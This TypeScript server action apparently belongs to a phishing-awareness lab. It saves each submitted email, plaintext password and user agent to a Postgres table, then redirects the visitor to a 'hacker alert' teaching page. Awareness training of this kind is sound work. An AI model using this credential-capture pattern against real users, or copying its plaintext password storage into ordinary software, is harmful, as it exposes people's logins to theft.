"use server";
import { PrismaClient } from "@prisma/client";
import { headers } from "next/headers";
import { redirect } from "next/navigation";

const prisma = new PrismaClient();

export async function handleSubmission(formData: FormData) {
  // 1. Get request metadata
  const headerList = await headers(); 
  const userAgent = headerList.get("user-agent") || "Unknown";

  // 2. Extract form data
  const email = formData.get("email") as string;
  const password = formData.get("password") as string;

  // 3. Save to Postgres via Prisma
  try {
    await prisma.labSubmission.create({
      data: {
        email: email || "no-email",
        password: password || "no-password",
        userAgent: userAgent,
      },
    });
  } catch (error) {
    console.error("Database Save Error:", error);
  }

  // 4. Redirect to the educational "Hacking Background" page
  redirect("/hacker-alert");
}